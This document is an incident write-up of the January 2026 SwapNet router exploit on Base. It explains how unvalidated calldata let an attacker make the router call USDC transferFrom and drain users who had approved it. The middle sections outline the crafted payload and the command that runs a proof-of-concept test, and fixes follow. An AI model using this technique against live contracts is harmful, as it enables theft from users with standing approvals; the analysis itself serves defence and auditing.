# SwapNet Router Exploit Analysis

## Overview

**Date:** January 25, 2026
**Protocol:** SwapNet (Matcha Meta Aggregator)
**Network:** Base (Chain ID: 8453)
**Attack Transaction:** [0xc15df1...](https://basescan.org/tx/0xc15df1d131e98d24aa0f107a67e33e66cf2ea27903338cc437a3665b6404dd57)
**Total Loss:** ~$13M USD (Base, BSC, Arbitrum combined)

---

## Quick Start

### Running the PoC

```bash
forge test --match-path "test/2026-01-25_SwapNet/SwapNet.sol" -vv
```

**Expected Output:**
```
[PASS] testExploit()
  Victim USDC Balance (Before): 13342433169249
  Victim USDC Balance (After): 0
  Attacker USDC Balance (After): 13342433169249
  Stolen Amount: 13342433169249
```

---

## Technical Analysis

### Root Cause

The `0x87395540` function accepts user-supplied calldata (`varg1`) without validating:
- ✗ Target contract is a whitelisted DEX pool
- ✗ Function selector is an approved swap function
- ✗ Call parameters match expected swap structure

### Exploitation Mechanism

#### Step 1: Bypass Deposit Logic (Optional)
```solidity
// In varg0 (swap metadata):
word2 (amountIn) = 0
```
Setting `amountIn` to 0 skips input token verification. **Testing revealed this is optional** - the attack succeeds even with `word2 = 1`.

#### Step 2: Inject Malicious External Call (Critical)
```solidity
// In varg1 (command array):
target = USDC_CONTRACT_ADDRESS  // Instead of DEX pool
calldata = abi.encodeWithSelector(
    IERC20.transferFrom.selector,
    VICTIM_ADDRESS,
    ATTACKER_ADDRESS,
    VICTIM_BALANCE
)
```

The Router executes this call in its own context, leveraging existing user approvals.

#### Step 3: Drain via Existing Approvals
Users had previously approved the Router for gas-efficient swaps:
```solidity
USDC.approve(ROUTER, type(uint256).max);
```

The Router's call to `USDC.transferFrom(victim, attacker, amount)` succeeds because the Router has approval.

---

## Attack Flow Diagram

```
┌─────────────┐
│   Victim    │ approve(Router, ∞)
│ (Has USDC)  │─────────────────────┐
└─────────────┘                     │
                                    ▼
                          ┌─────────────────┐
                          │ SwapNet Router  │
                          │ Implementation  │
                          └────────┬────────┘
                                   │
                    ⚠️ EXPLOIT: Malicious 0x87395540 call
                                   │
                    ┌──────────────┴───────────────┐
                    │ Crafted Payload:             │
                    │  varg0: iterator=2           │
                    │  varg1:                      │
                    │    target = USDC             │ ← No validation!
                    │    calldata = transferFrom(  │
                    │      from: Victim,           │
                    │      to: Attacker,           │
                    │      amount: 13.3M USDC      │
                    │    )                         │
                    └──────────────┬───────────────┘
                                   │
                                   ▼
                          ┌─────────────┐
                          │  Attacker   │
                          │ (Receives   │
                          │  13.3M USDC)│
                          └─────────────┘
```

---

## Impact Assessment

### Financial Impact
- **Single Transaction Loss:** $13.3M USDC (analyzed victim)
- **Estimated Total Loss:** ~$13M across multiple chains
- **Affected Networks:** Base, BSC, Arbitrum

### Affected Users
All users who:
1. Granted token approvals to SwapNet Router
2. Had non-zero token balances at time of attack

---

## Recommended Fixes

### Immediate (Emergency)

1. **Pause Router Contract**
   ```solidity
   function pause() external onlyOwner {
       _pause();
   }
   ```

2. **Revoke Approvals (Users)**
   ```solidity
   USDC.approve(ROUTER, 0);
   ```

### Short-term (Critical Patch)

1. **Whitelist Target Contracts**
   ```solidity
   mapping(address => bool) public approvedPools;

   function execute(address target, bytes calldata data) internal {
       require(approvedPools[target], "Target not whitelisted");
       target.call(data);
   }
   ```

2. **Validate Function Selectors**
   ```solidity
   mapping(bytes4 => bool) public approvedSelectors;

   function execute(address target, bytes calldata data) internal {
       bytes4 selector = bytes4(data[:4]);
       require(approvedSelectors[selector], "Selector not approved");
       target.call(data);
   }
   ```

## References

- **Attack Transaction:** [Basescan](https://basescan.org/tx/0xc15df1d131e98d24aa0f107a67e33e66cf2ea27903338cc437a3665b6404dd57)
- **Victim Address:** `0xba15E9b644685cB845aF18a738Abd40C6Bcd78eD`
- **Attacker Address:** `0x6cAad74121bF602e71386505A4687f310e0D833e`
- **SwapNet Router:** `0x616000e384Ef1C2B52f5f3A88D57a3B64F23757e`

---

## Status

✅ PoC Validated | 🔴 Critical Severity | 📋 Ready for Audit Submission

## Auditors
- [x] @Ham3798
